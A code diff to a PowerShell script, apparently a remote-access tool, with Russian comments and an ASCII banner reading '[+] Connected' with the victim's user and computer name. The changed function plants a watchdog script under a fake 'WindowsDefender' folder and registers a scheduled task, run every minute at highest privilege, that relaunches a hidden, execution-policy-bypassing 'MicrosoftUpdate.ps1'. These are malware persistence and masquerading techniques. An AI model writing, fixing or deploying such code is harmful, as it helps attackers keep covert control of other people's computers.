@@ -413,19 +413,25 @@ function Register-SelfWatchTask {
     $watchScriptPath = "$env:APPDATA\WindowsDefender\watchdog.ps1"
 
     $watchScript = @"
-Add-Content -Path "`"$env:APPDATA\WindowsDefender\watchdog.log`"" -Value "`"[*] Watchdog run: \$(Get-Date)`"
+Add-Content -Path `"$env:APPDATA\WindowsDefender\watchdog.log`" -Value "`"[*] Watchdog run: \$(Get-Date)`"
+
 \$path = `"$env:APPDATA\WindowsDefender\MicrosoftUpdate.ps1`"
 \$running = Get-CimInstance Win32_Process | Where-Object { \$_.CommandLine -match [Regex]::Escape(\$path) }
+
 if (-not \$running) {
-    Start-Process powershell.exe "`"-WindowStyle Hidden -ExecutionPolicy Bypass -File `"\$path`"`"
+    Start-Process powershell.exe "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"\$path`""
 }
 "@
 
+    # Сохраняем скрипт в нужный путь
     $watchScript | Set-Content -Path $watchScriptPath -Encoding UTF8 -Force
 
+    # Удаляем старую задачу
     schtasks /Delete /TN $taskName /F > $null 2>&1
+
+    # Регистрируем задачу
     schtasks /Create /TN $taskName /SC MINUTE /MO 1 `
-        /TR "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watchScriptPath`"" `
+        /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$watchScriptPath`"" `
         /RL HIGHEST /F | Out-Null
 }
 
@@ -707,7 +713,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            G455q                                                                                                                                                                   
+                                            453                                                                                                                                                                   
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
